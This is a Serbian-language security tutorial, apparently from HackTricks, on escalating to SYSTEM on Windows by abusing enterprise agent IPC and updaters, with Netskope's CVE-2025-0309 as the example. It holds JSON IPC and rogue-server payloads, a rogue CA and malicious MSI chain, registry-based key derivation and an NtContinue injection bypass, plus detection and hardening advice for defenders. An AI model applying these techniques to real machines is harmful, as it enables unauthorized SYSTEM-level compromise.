# Zloupotreba Enterprise Auto-Updaters i privilegisanog IPC-a (npr. Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

Ova stranica generalizuje klasu Windows lokalnih lanaca za eskalaciju privilegija pronađenih u enterprise endpoint agentima i updaterima koji izlažu low‑friction IPC površinu i privilegovani tok ažuriranja. Reprezentativan primer je Netskope Client for Windows < R129 (CVE-2025-0309), gde korisnik sa niskim privilegijama može naterati enrollment na server pod kontrolom napadača i zatim isporučiti zlonamerni MSI koji servis pokrenut kao SYSTEM instalira.

Ključne ideje koje možete ponovo iskoristiti protiv sličnih proizvoda:
- Zloupotrebite localhost IPC privilegisanog servisa da prisilite ponovni enrollment ili rekonfiguraciju na server napadača.
- Implementirajte vendorove update endpoint-e, dostavite lažni Trusted Root CA, i usmerite updater na zlonamerni „signed“ paket.
- Izbegnite slabe provere potpisivača (CN allow‑lists), opciona digest zastavice, i popustljiva MSI svojstva.
- Ako je IPC „encrypted“, izvedite key/IV iz world‑readable identifikatora mašine smeštenih u registry.
- Ako servis ograničava pozivaoce po image path/process name, injektujte u proces sa liste dozvoljenih ili spawn-ujte jedan u suspended stanju i bootstrap-ujte svoj DLL putem minimalnog patch-a thread‑contexta.

---
## 1) Prisiljavanje enrollmenta na server napadača preko localhost IPC-a

Mnogi agenti dolaze sa user‑mode UI procesom koji komunicira sa SYSTEM servisom preko localhost TCP koristeći JSON.

Primećeno u Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Tok eksploatacije:
1) Sastavite JWT enrollment token čiji claims kontrolišu backend host (npr. AddonUrl). Koristite alg=None tako da nije potreban potpis.
2) Pošaljite IPC poruku koja poziva provisioning command sa vašim JWT i tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Servis počinje da upućuje zahteve vašem zlonamernom serveru za enrollment/config, npr.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Ako je caller verification zasnovana na path/name‑based, pošaljite zahtev iz allow‑listed vendor binary (see §4).

---
## 2) Otmica update kanala da bi se pokrenuo kod kao SYSTEM

Kada klijent razgovara sa vašim serverom, implementirajte očekivane endpoints i usmerite ga na attacker MSI. Tipičan redosled:

1) /v2/config/org/clientconfig → Vratite JSON config sa veoma kratkim updater intervalom, npr.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Vraća PEM CA сертификат. Servis ga instalira u Local Machine Trusted Root store.
3) /v2/checkupdate → Dostavi metapodatke koji upućuju na maliciozni MSI i lažnu verziju.

Zaobilaženje uobičajenih provera viđenih u stvarnom svetu:
- Signer CN allow‑list: servis može samo proveravati da li Subject CN odgovara “netSkope Inc” ili “Netskope, Inc.”. Vaš rogue CA može izstaviti leaf sertifikat sa tim CN i potpisati MSI.
- CERT_DIGEST property: uključite benigni MSI property pod imenom CERT_DIGEST. Nema primene pri instalaciji.
- Optional digest enforcement: konfig flag (npr. check_msi_digest=false) onemogućava dodatnu kriptografsku validaciju.

Rezultat: SYSTEM servis instalira vaš MSI iz
C:\ProgramData\Netskope\stAgent\data\*.msi
i izvršava proizvoljni kod kao NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Od R127, Netskope je umotao IPC JSON u polje encryptData koje liči na Base64. Reverzno inženjerstvo je pokazalo AES sa ključem/IV izvedenim iz vrednosti u registry-ju koje su čitljive bilo kom korisniku:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Napadači mogu reprodukovati enkripciju i poslati validne enkriptovane komande iz standardnog korisničkog konteksta. Opšti savet: ako agent iznenada „šifruje“ svoj IPC, tražite device ID-e, product GUID-ove, install ID-e pod HKLM kao materijal za derivaciju.

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

Neki servisi pokušavaju da autentifikuju peer rešavanjem PID-a TCP konekcije i poređenjem image path/name sa allow‑listovanim vendor binarima smeštenim pod Program Files (npr. stagentui.exe, bwansvc.exe, epdlp.exe).

Dva praktična zaobilaženja:
- DLL injection u allow‑listovani proces (npr. nsdiag.exe) i proxy-ovanje IPC iznutra.
- Pokrenuti allow‑listovani binarni fajl u suspended stanju i bootstrap-ovati svoj proxy DLL bez CreateRemoteThread (vidi §5) da biste zadovoljili driver‑enforced tamper pravila.

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

Proizvodi često isporučuju minifilter/OB callbacks driver (npr. Stadrv) koji uklanja opasna prava sa handle-ova za zaštićene procese:
- Process: uklanja PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: ograničava na THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Pouzdan user‑mode loader koji poštuje ta ograničenja:
1) CreateProcess vendor binar‑a sa CREATE_SUSPENDED.
2) Nabavite handle-ove kojih ste još uvek sposobni: PROCESS_VM_WRITE | PROCESS_VM_OPERATION na procesu, i thread handle sa THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ili samo THREAD_RESUME ako patch-ujete kod na poznatom RIP).
3) Overwrite ntdll!NtContinue (ili drugi rani, garantovano mapiran thunk) sa malim stub-om koji poziva LoadLibraryW na putanju vaše DLL, zatim se vraća.
4) ResumeThread da pokrenete vaš stub u procesu, koji učita vašu DLL.

Pošto nikada niste koristili PROCESS_CREATE_THREAD ili PROCESS_SUSPEND_RESUME na već‑zaštićenom procesu (vi ste ga kreirali), driver-ova politika je zadovoljena.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatizuje rogue CA, potpisivanje malicioznog MSI-a i servisira potrebne endpoint-e: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope je custom IPC client koji gradi proizvoljne (opciono AES‑šifrovane) IPC poruke i uključuje suspended‑process injection da poreklo bude iz allow‑listovanog binarnog fajla.

---
## 7) Detection opportunities (blue team)
- Monitorisati dodatke u Local Machine Trusted Root. Sysmon + registry‑mod eventing (vidi SpecterOps guidance) dobro rade.
- Flagovati MSI izvršenja pokrenuta od strane agentovog servisa iz putanja kao što su C:\ProgramData\<vendor>\<agent>\data\*.msi.
- Pregledati agent logove za neočekivane enrollment hostove/tenant-e, npr.: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – tražiti addonUrl / tenant anomalije i provisioning msg 148.
- Alertovati na localhost IPC klijente koji nisu očekivani signed binari, ili koji potiču iz neuobičajenih child process tree-ova.

---
## Hardening tips for vendors
- Bind enrollment/update hostove na strogu allow‑listu; odbijajte nepouzdane domene u clientcode-u.
- Autentifikujte IPC peer‑ove OS primitivima (ALPC security, named‑pipe SIDs) umesto provera image path/name.
- Držite tajni materijal van world‑readable HKLM; ako IPC mora biti enkriptovan, izvedite ključeve iz zaštićenih secret-a ili pregovarajte preko autentifikovanih kanala.
- Tretirajte updater kao supply‑chain površinu: zahtevajte pun lanac do trusted CA koju kontrolišete, verifikujte potpis paketa prema pinned ključevima i fail‑closed ako je validacija onemogućena u konfiguraciji.

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
